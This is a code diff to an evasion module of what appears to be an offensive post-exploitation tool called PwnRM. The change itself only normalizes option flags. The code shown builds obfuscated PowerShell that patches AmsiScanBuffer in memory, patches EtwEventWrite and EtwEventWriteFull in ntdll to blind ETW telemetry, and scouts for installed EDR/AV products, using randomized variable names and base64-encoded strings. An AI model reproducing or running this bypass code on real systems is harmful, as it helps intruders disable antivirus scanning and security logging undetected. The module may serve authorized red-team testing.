@@ -17,23 +17,25 @@ class EvasionModule(BaseModule):
     description = "Runtime AMSI/ETW patching and EDR/AV process-driver inventory"
     author = "uziii2208"
     options = {
-        "--edr": {"desc": "Inspect running drivers/processes for EDR/AV products"},
-        "--amsi": {"desc": "Apply polymorphic in-memory AMSI bypass"},
-        "--etw": {"desc": "Patch EtwEventWrite & EtwEventWriteFull in ntdll.dll to blind ETW telemetry"},
+        "edr": {"desc": "Inspect running drivers/processes for EDR/AV products"},
+        "amsi": {"desc": "Apply polymorphic in-memory AMSI bypass"},
+        "etw": {"desc": "Patch EtwEventWrite & EtwEventWriteFull in ntdll.dll to blind ETW telemetry"},
     }
 
     def run(self, shell, args: List[str]) -> Any:
-        valid = {"--edr", "--amsi", "--etw"}
-        unknown = [arg for arg in args if arg not in valid]
+        aliases = {f"--{mode}": mode for mode in self.options}
+        normalized = [aliases.get(arg.lower(), arg.lower()) for arg in args]
+        valid = set(self.options)
+        unknown = [arg for arg in normalized if arg not in valid]
         if unknown:
             shell.write_warning(f"  [-] Unknown evasion option(s): {', '.join(unknown)}")
             return {"status": "error", "error": "invalid options"}
 
-        selected = set(args) if args else {"--amsi", "--etw"}
+        selected = set(normalized) if normalized else {"amsi", "etw"}
         shell.write_info(c(M + BLD, "  [*] PwnRM Evasion Suite — applying selected runtime OPSEC controls..."))
 
         # 1. EDR Inspection
-        if "--edr" in selected:
+        if "edr" in selected:
             ps_edr = r"""
 Write-Host "`n[EDR / AV Product Driver & Service Scout]" -ForegroundColor Yellow
 $edrList = @(
@@ -61,7 +63,7 @@ if ($avProds) {
         rand_var2 = "$old" + secrets.token_hex(4)
         cmds = [_import_LoadLibrary, _import_GetProcAddress, _import_VirtualProtect]
 
-        if "--amsi" in selected:
+        if "amsi" in selected:
             amsi_arr, amsi_len, _ = build_amsi_patch()
             cmds.extend([
                 f"{rand_var1} = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
@@ -71,7 +73,7 @@ if ($avProds) {
                 f"$null = {_call_VirtualProtect}({rand_var1}, [IntPtr]{amsi_len}, {rand_var2}, [ref]{rand_var2})",
             ])
 
-        if "--etw" in selected:
+        if "etw" in selected:
             # x64 uses the caller-cleaned ABI; a plain RET is required.  On
             # x86 the stdcall callee must remove each function's arguments.
             for etw_fn, x86_cleanup in (("EtwEventWrite", 0x14), ("EtwEventWriteFull", 0x1C)):
@@ -84,14 +86,14 @@ if ($avProds) {
                     f"$null = {_call_VirtualProtect}({rand_var1}, [IntPtr]$patch.Length, {rand_var2}, [ref]{rand_var2})",
                 ])
 
-        if "--amsi" in selected or "--etw" in selected:
+        if "amsi" in selected or "etw" in selected:
             cmds.append(f"Remove-Variable @('{rand_var1[1:]}','{rand_var2[1:]}','patch') -ErrorAction SilentlyContinue")
 
-        if "--amsi" in selected or "--etw" in selected:
+        if "amsi" in selected or "etw" in selected:
             labels = []
-            if "--amsi" in selected:
+            if "amsi" in selected:
                 labels.append("AMSI")
-            if "--etw" in selected:
+            if "etw" in selected:
                 labels.append("ETW")
             label = " + ".join(labels)
             shell.write_info(c(Y, f"  [*] Applying in-memory {label} patch(es)..."))
